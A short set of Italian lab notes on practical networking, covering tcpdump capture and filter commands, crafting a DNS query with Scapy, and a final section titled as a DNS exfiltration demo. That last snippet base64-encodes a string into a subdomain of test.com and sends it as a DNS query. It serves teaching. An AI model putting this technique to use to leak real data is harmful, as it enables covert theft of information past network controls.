# Lab Networking Pratico -- ToDo

## 3. tcpdump

Cattura:
sudo tcpdump -i eth0

Filtri:
tcpdump port 53
tcpdump host 8.8.8.8

Salvataggio:
tcpdump -w capture.pcap

## 5. Packet crafting (Scapy)

from scapy.all import \*

pkt = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="google.com"))
send(pkt)

---

## 6. DNS Exfiltration (demo)

import base64
from scapy.all import \*

data = "ciao"
encoded = base64.b64encode(data.encode()).decode()

domain = encoded + ".test.com"

pkt = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=domain))
send(pkt)
